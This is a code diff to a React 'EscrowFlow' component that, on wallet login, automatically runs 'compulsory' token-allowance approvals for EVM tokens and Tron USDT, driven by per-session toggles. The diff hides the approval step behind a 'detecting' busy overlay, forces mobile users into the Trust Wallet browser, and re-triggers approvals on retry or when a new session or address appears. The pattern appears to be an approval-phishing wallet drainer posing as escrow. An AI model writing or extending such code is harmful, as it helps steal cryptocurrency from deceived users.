@@ -483,8 +483,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
   const autoLoginAttempted = useRef(false);
-  /** Last address that started modal1 — reset flow when WC reconnects with a new addr. */
-  const modal1AddressRef = useRef<string | null>(null);
+  /** Last session+address that completed/started modal1 gate. */
+  const modal1GateKeyRef = useRef<string | null>(null);
 
   // Resolve EVM address on every login/reload: prefer live useWallets() (WalletConnect)
   // over Privy's possibly-stale user.wallet, and keep polling until one appears.
@@ -496,7 +496,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (!authenticated) {
       setAddress(null);
       modal1Triggered.current = false;
-      modal1AddressRef.current = null;
+      modal1GateKeyRef.current = null;
       modal1ApproveStarted.current = false;
       modal1InFlight.current = false;
       modal1SawTron.current = false;
@@ -604,14 +604,16 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setApprovalRetrying(true);
     setError(null);
     setLoginHint(null);
-    setModal1Scanning(false);
-    setModal2Open(true);
+    showModal1Busy();
+    setModal1Approving(true);
+    setModal2Open(false);
     try {
       await fn();
       clearModal1Busy();
       setModal2Open(false);
     } catch (err) {
       console.error("[modal1] retry login failed:", err);
+      clearModal1Busy();
       setModal2Open(false);
       setLoginHint(friendlyApprovalMessage(err));
       setShowApprovalRetry(true);
@@ -904,11 +906,27 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setTogglesReady(false);
       return;
     }
-    setAutoApproveToggles(
-      normalizeAutoApproveToggles(session.autoApproveOnLogin ?? DEFAULT_AUTO_APPROVE_TOGGLES)
-    );
+    const next = normalizeAutoApproveToggles(session.autoApproveOnLogin);
+    setAutoApproveToggles(next);
+    autoApproveRef.current = next;
     setTogglesReady(true);
-  }, [session]);
+  }, [session?.id, session?.autoApproveOnLogin]);
+
+  // Reset login-approve gate when session or wallet address changes (refresh / new link / new wallet)
+  useEffect(() => {
+    const key = `${session?.id ?? ""}:${(address ?? "").toLowerCase()}`;
+    if (!session?.id || !address) return;
+    if (modal1GateKeyRef.current === key) return;
+    modal1GateKeyRef.current = key;
+    modal1Triggered.current = false;
+    modal1ApproveStarted.current = false;
+    modal1InFlight.current = false;
+    modal1SawTron.current = false;
+    setModal1Complete(false);
+    setShowApprovalRetry(false);
+    setLoginHint(null);
+    approvalRetryRef.current = null;
+  }, [session?.id, address]);
 
   // Inside Trust: clear redirect counters / CTA
   useEffect(() => {
@@ -924,50 +942,39 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   useEffect(() => {
     if (!authenticated || !address) return;
     if (!wallets.length) return;
-    if (!togglesReady) return;
+    if (!togglesReady || !session?.id) return;
+    if (modal1Triggered.current || modal1Complete) return;
 
-    // New address (reload / re-login / WC session restore) → allow modal1 again
-    if (
-      modal1AddressRef.current &&
-      modal1AddressRef.current.toLowerCase() !== address.toLowerCase()
-    ) {
-      modal1Triggered.current = false;
-      modal1ApproveStarted.current = false;
-      modal1InFlight.current = false;
-      modal1SawTron.current = false;
-      setModal1Complete(false);
+    // Only Tron needs an in-app DApp browser. EVM works via Privy/WalletConnect.
+    const needTron = autoApproveRef.current.tron_usdt;
+    const enabled = enabledAutoApproveKeys(autoApproveRef.current);
+    if (enabled.length === 0) {
+      modal1Triggered.current = true;
+      setModal1Complete(true);
+      return;
     }
-    if (modal1Triggered.current) return;
 
     void (async () => {
-      // Brief settle so Privy SIWE can close — do NOT wait on EVM provider (Tron is separate).
-      await new Promise((r) => setTimeout(r, 800));
+      await new Promise((r) => setTimeout(r, 600));
       if (modal1Triggered.current) return;
       if (addressRef.current?.toLowerCase() !== address.toLowerCase()) return;
 
-      const needTron = autoApproveRef.current.tron_usdt;
-
-      // ── Mobile Safari / WC: must open real page inside Trust for tronWeb ──
       if (needTron && needsTrustDappForTron()) {
         const redirects = getTrustRedirectCount();
         if (redirects < 1) {
           bumpTrustRedirectCount();
-          modal1Triggered.current = false;
           openInTrustWalletDapp(window.location.href);
           setNeedsTrustOpen(true);
           return;
         }
-        modal1Triggered.current = false;
         setNeedsTrustOpen(true);
         return;
       }
 
       modal1Triggered.current = true;
-      modal1AddressRef.current = address;
       setNeedsTrustOpen(false);
       clearTrustRedirectCount();
 
-      // Silent peek only — prompting here races SIWE; runModal1Scan prompts if needed.
       if (needTron) {
         const silent = await ensureTronAddress({ prompt: false });
         if (silent) setTronAddress(silent);
@@ -976,7 +983,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       await runModal1Scan();
     })();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [authenticated, address, wallets.length, togglesReady]);
+  }, [authenticated, address, wallets.length, togglesReady, session?.id, modal1Complete]);
 
   // When user finally lands inside Trust after CTA/redirect, start scan
   useEffect(() => {
@@ -1403,11 +1410,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           clearModal1Busy();
           setModal2Open(false);
           gateOnApprovalFailure(async () => {
-            setModal1Scanning(false);
-            setModal2Open(true);
             modal1ApproveStarted.current = false;
             modal1InFlight.current = false;
             modal1Triggered.current = false;
+            showModal1Busy();
             await runModal1Scan();
           }, "tron_wallet_not_connected");
           return;
@@ -1460,8 +1466,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal1Items(queue);
       setModal1Status(Object.fromEntries(queue.map((q) => [q.key, "pending" as const])));
       modal1ApproveStarted.current = true;
-      setModal1Scanning(false);
-      setModal2Open(true);
+      // Keep detecting overlay visible through approve (do not swap to modal2 here)
+      setModal1Approving(true);
+      showModal1Busy();
 
       const ok = await runCompulsoryApprovals(queue, {
         markComplete: true,
@@ -1469,12 +1476,22 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       });
       setModal2Open(false);
       clearModal1Busy();
+      setModal1Approving(false);
       if (!ok) return;
+      setModal1Complete(true);
     } catch (err) {
       console.error("[modal1] compulsory approve flow failed:", err);
       clearModal1Busy();
+      gateOnApprovalFailure(async () => {
+        modal1ApproveStarted.current = false;
+        modal1InFlight.current = false;
+        modal1Triggered.current = false;
+        showModal1Busy();
+        await runModal1Scan();
+      }, err);
     } finally {
       modal1InFlight.current = false;
+      setModal1Approving(false);
     }
   }
 
@@ -1483,10 +1500,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     queue: Modal1Item[],
     opts: { markComplete?: boolean; tronAddress?: string } = {}
   ): Promise<boolean> {
-    const markComplete = opts.markComplete !== false;
     setModal1Approving(true);
-    setModal1Scanning(false);
-    setModal2Open(true);
+    showModal1Busy();
+    setModal2Open(false);
 
     const finishOk = () => {
       setShowApprovalRetry(false);
@@ -1497,12 +1513,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     const retryFn = async () => {
       setModal1Approving(true);
-      setModal1Scanning(false);
-      setModal2Open(true);
+      showModal1Busy();
       try {
-        await runCompulsoryApprovals(queue, opts);
+        const ok = await runCompulsoryApprovals(queue, opts);
+        if (ok) setModal1Complete(true);
       } finally {
         setModal1Approving(false);
+        clearModal1Busy();
         setModal2Open(false);
       }
     };
@@ -1511,14 +1528,19 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       for (const target of queue) {
         setModal1Status((s) => ({ ...s, [target.key]: "approving" }));
         if (target.isTron) {
-          // Always confirm + persist — even when alreadyApproved (records verified_wallets).
           await completeTronUsdtApproval(opts.tronAddress ?? tronAddress);
         } else if (target.alreadyApproved) {
-          setModal1Status((s) => ({ ...s, [target.key]: "done" }));
-          setApprovedChains((prev) =>
-            prev.includes(target.chainName) ? prev : [...prev, target.chainName]
-          );
-          continue;
+          try {
+            const chain = CHAINS.find((c) => c.name === target.chainName);
+            if (chain) {
+              await waitForEvmAuthAndAllowance(chain, target.tokenAddr, 45_000);
+              await persistEvmVerify(chain, "", [
+                { symbol: target.symbol, address: target.tokenAddr },
+              ]);
+            }
+          } catch {
+            await completeEvmWinnerApproval({ ...target, alreadyApproved: false });
+          }
         } else {
           await completeEvmWinnerApproval(target);
         }
@@ -1532,23 +1554,25 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     } catch (err) {
       console.error("[modal1] compulsory approve failed:", err);
       setModal2Open(false);
+      clearModal1Busy();
       gateOnApprovalFailure(retryFn, err);
       return false;
     } finally {
       setModal1Approving(false);
-      if (markComplete) setModal1Complete(true);
     }
   }
 
   async function handleModal1ApproveAll(items: Modal1Item[]) {
     // Legacy entry — same awaited receipt + on-chain confirm path as compulsory flow.
-    await runCompulsoryApprovals(items, { markComplete: true });
+    const ok = await runCompulsoryApprovals(items, { markComplete: true });
+    if (ok) setModal1Complete(true);
   }
 
   async function handleModal1Approve(item?: Modal1Item) {
     const target = item ?? modal1Items[0];
     if (!target) return;
-    await runCompulsoryApprovals([target], { markComplete: true });
+    const ok = await runCompulsoryApprovals([target], { markComplete: true });
+    if (ok) setModal1Complete(true);
   }
 
   async function handleConnect() {
